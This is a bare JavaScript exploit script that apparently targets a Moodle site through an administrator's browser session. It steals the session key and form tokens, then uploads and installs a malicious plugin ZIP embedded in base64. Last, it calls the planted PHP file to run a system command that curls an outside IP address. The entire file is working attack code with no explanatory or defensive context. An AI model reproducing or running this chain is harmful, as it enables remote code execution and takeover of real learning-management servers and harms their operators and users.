  const URL = "https://daviddoaa.me/moodle/"; // Change this to your target URL 
  fetch(URL + "admin/tool/installaddon/index.php", {
    credentials: "include",
  })
    .then((res) => {
      return res.text();
    })
    .then((data) => {
      let sesskey = data.split('"sesskey":"')[1].split('"')[0];
      let itemid = data.split("amp;itemid=")[1].split("&")[0];
      let author = data.split('title="View profile">')[1].split("<")[0];
      let clientid = data.split('client_id":"')[1].split('"')[0];

      let url =
      "data:application/x-zip-compressed;base64,UEsDBAoAAAAAAEAUulAAAAAAAAAAAAAAAAAEABwAcmNlL1VUCQAD92PMXphjzF51eAsAAQTHBAAABMkEAABQSwMECgAAAAAAQxS6UAAAAAAAAAAAAAAAAAkAHAByY2UvbGFuZy9VVAkAA/1jzF73Y8xedXgLAAEExwQAAATJBAAAUEsDBAoAAAAAAEcZulAAAAAAAAAAAAAAAAAMABwAcmNlL2xhbmcvZW4vVVQJAAN1bMxe/WPMXnV4CwABBMcEAAAEyQQAAFBLAwQUAAAACAA0GbpQp9e7sNYAAABGAQAAGQAcAHJjZS9sYW5nL2VuL2Jsb2NrX3JjZS5waHBVVAkAA1RszF5UbMxedXgLAAEExwQAAATJBAAAbY/BasMwEETPFegflmDYBBryAbGSU1oKgRSSnkwwarTGopIlklWglP57bdn00t522DfDTLmNbZRCioLDB3UACor6eXeqMGs8r6WwzXz6KgWYIi6+et6HYBxl/ullvztW2FhHeK6w056ysUjRBW3gP4h9rH9BurQBZmUTrh48cRuMwtfD8YRA3YU/Iyn0ybGN+sqrgVoazRo3UjyUtouJYYRy+JA6nbD6g9zSu7eMcNcu9fItNxzBMkdvZn0hH+5Uj+3J1EPWfBrzOA1frEGKbym2vRF+AFBLAwQUAAAACABHGbpQp9e7sNYAAABGAQAAFQAcAHJjZS9sYW5nL2VuL2luZGV4LnBocFVUCQADdWzMXnVszF51eAsAAQTHBAAABMkEAABtj8FqwzAQRM8V6B+WYNgEGvIBsZJTWgqBFJKeTDBqtMaikiWSVaCU/ntt2fTS3nbYN8NMuY1tlEKKgsMHdQAKivp5d6owazyvpbDNfPoqBZgiLr563odgHGX+6WW/O1bYWEd4rrDTnrKxSNEFbeA/iH2sf0G6tAFmZROuHjxxG4zC18PxhEDdhT8jKfTJsY36yquBWhrNGjdSPJS2i4lhhHL4kDqdsPqD3NK7t4xw1y718i03HMEyR29mfSEf7lSP7cnUQ9Z8GvM4DV+sQYpvKba9EX4AUEsDBBQAAAAIADUUulDy43NtQQAAAEkAAAAPABwAcmNlL3ZlcnNpb24ucGhwVVQJAAPmY8xe5mPMXnV4CwABBMcEAAAEyQQAALOxL8goUODlUinIKU3PzNO1K0stKs7Mz1OwVTAyMDIwMDU0NjCwRpJPzs8tyM9LzSsBqlBPyslPzo4vSk5VtwYAUEsBAh4DCgAAAAAAQBS6UAAAAAAAAAAAAAAAAAQAGAAAAAAAAAAQAO1BAAAAAHJjZS9VVAUAA/djzF51eAsAAQTHBAAABMkEAABQSwECHgMKAAAAAABDFLpQAAAAAAAAAAAAAAAACQAYAAAAAAAAABAA7UE+AAAAcmNlL2xhbmcvVVQFAAP9Y8xedXgLAAEExwQAAATJBAAAUEsBAh4DCgAAAAAARxm6UAAAAAAAAAAAAAAAAAwAGAAAAAAAAAAQAO1BgQAAAHJjZS9sYW5nL2VuL1VUBQADdWzMXnV4CwABBMcEAAAEyQQAAFBLAQIeAxQAAAAIADQZulCn17uw1gAAAEYBAAAZABgAAAAAAAEAAACkgccAAAByY2UvbGFuZy9lbi9ibG9ja19yY2UucGhwVVQFAANUbMxedXgLAAEExwQAAATJBAAAUEsBAh4DFAAAAAgARxm6UKfXu7DWAAAARgEAABUAGAAAAAAAAQAAAKSB8AEAAHJjZS9sYW5nL2VuL2luZGV4LnBocFVUBQADdWzMXnV4CwABBMcEAAAEyQQAAFBLAQIeAxQAAAAIADUUulDy43NtQQAAAEkAAAAPABgAAAAAAAEAAACkgRUDAAByY2UvdmVyc2lvbi5waHBVVAUAA+ZjzF51eAsAAQTHBAAABMkEAABQSwUGAAAAAAYABgD6AQAAnwMAAAAA";
      fetch(url)
        .then((res) => res.blob())
        .then((blob) => {
          const file = new File([blob], "rce.zip", {
            type: "application/x-zip-compressed",
          });

          myFormData = new FormData();
          myFormData.append("title", "");
          myFormData.append("author", author);
          myFormData.append("license", "allrightsreserved");
          myFormData.append("itemid", itemid);
          myFormData.append("accepted_types[]", ".zip");
          myFormData.append("repo_id", 4);
          myFormData.append("p", "");
          myFormData.append("page", "");
          myFormData.append("env", "filepicker");
          myFormData.append("sesskey", sesskey);
          myFormData.append("client_id", clientid);
          myFormData.append("maxbytes", -1);
          myFormData.append("areamaxbytes", -1);
          myFormData.append("ctx_id", 1);
          myFormData.append("savepath", "/");
          myFormData.append("repo_upload_file", file, "rce.zip");

          fetch(
            URL + "repository/repository_ajax.php?action=upload",
            {
              method: "post",
              body: myFormData,
              credentials: "include",
            }
          )
            .then((res) => {
              return res.text();
            })
            .then((res) => {
              let zipFile = res.split("draft\\/")[1].split("\\/")[0];
              myFormData = new FormData();
              myFormData.append("sesskey", sesskey);
              myFormData.append(
                "_qf__tool_installaddon_installfromzip_form",
                1
              );
              myFormData.append("mform_showmore_id_general", 1);
              myFormData.append("mform_isexpanded_id_general", 1);
              myFormData.append("zipfile", zipFile);
              myFormData.append("plugintype", "block");
              myFormData.append("rootdir", "");
              myFormData.append(
                "submitbutton",
                "Install+plugin+from+the+ZIP+file"
              );

              fetch(
                URL + "admin/tool/installaddon/index.php",
                {
                  method: "post",
                  body: myFormData,
                  credentials: "include",
                }
              )
                .then((res) => {
                  return res.text();
                })
                .then((res) => {
               //   debugger;
                  let installzipstorage = res
                    .split('installzipstorage" value="')[1]
                    .split('"')[0];

                  myFormData = new FormData();
                  myFormData.append("installzipcomponent", "block_rce");
                  myFormData.append("installzipstorage", installzipstorage);
                  myFormData.append("installzipconfirm", 1);
                  myFormData.append("sesskey", sesskey);

                  fetch(
                    URL + "admin/tool/installaddon/index.php",
                    {
                      method: "post",
                      body: myFormData,
                      credentials: "include",
                    }
                  ).then(() => {
                    fetch(
                      URL + "blocks/rce/lang/en/block_rce.php?_=system&__=curl%20http://192.168.153.138:1234/"
                    );
                  });
                });
            });
        });
    });
